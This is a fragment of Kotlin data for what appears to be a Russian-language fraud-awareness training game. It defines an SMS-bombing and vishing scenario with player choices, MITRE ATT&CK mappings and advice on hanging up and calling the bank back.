                            numberDisplay = "+7 (495) 123-45-67",
                        ),
                    ),
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "sbp-1-smoke",
                            title = "Зачем шум",
                            body = "Бомбинг SMS перегружает внимание и мешает отличить фишинговое «BankAlert» от реальных уведомлений. Звонок в пик шума усиливает давление.",
                        ),
                        InternalInvestigationPanel(
                            id = "sbp-1-vish",
                            title = "Vishing",
                            body = "Номер на экране можно подделать (spoofing). Единственный безопасный исходящий контакт с банком — тот, что вы берёте из приложения или с оборота карты.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "sbp-1-drop-app",
                            label = "Сбросить звонок → банк через приложение / номер с карты",
                            choiceId = "sbp-1-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "sbp-1-dictate",
                            label = "Ответить и продиктовать код из SMS",
                            choiceId = "sbp-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "sbp-1-remote",
                            label = "Ответить и поставить AnyDesk по инструкции",
                            choiceId = "sbp-1-c",
                            variant = "ACTION",
                        ),
                    ),
                    pressureSeconds = 75,
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "SMS-бомбинг как прикрытие: поток сервисных SMS парализует внимание — именно в этот момент звонит «сотрудник безопасности». Шум = сигнал атаки.",
                techniques = listOf(
                    AttackTechnique("T1566.006", "Phishing via SMS (Smishing)", "Initial Access",
                        "Массовая SMS-рассылка создаёт хаос и отвлекает внимание жертвы от реальной операции."),
                    AttackTechnique("T1598", "Phishing for Information", "Reconnaissance",
                        "Голосовой звонок «из банка» под прикрытием SMS-шторма выманивает коды и данные карты."),
                    AttackTechnique("T1562", "Impair Defenses", "Defense Evasion",
                        "Поток уведомлений подавляет критическое мышление и маскирует реальную мошенническую транзакцию."),
                ),
                howToDefend = "SMS-шторм сам по себе — признак атаки. Положи трубку, перезвони в банк самостоятельно по номеру с карты или официального сайта. Никогда не называй коды из SMS по входящему звонку.",
            ),
        )
    }
}
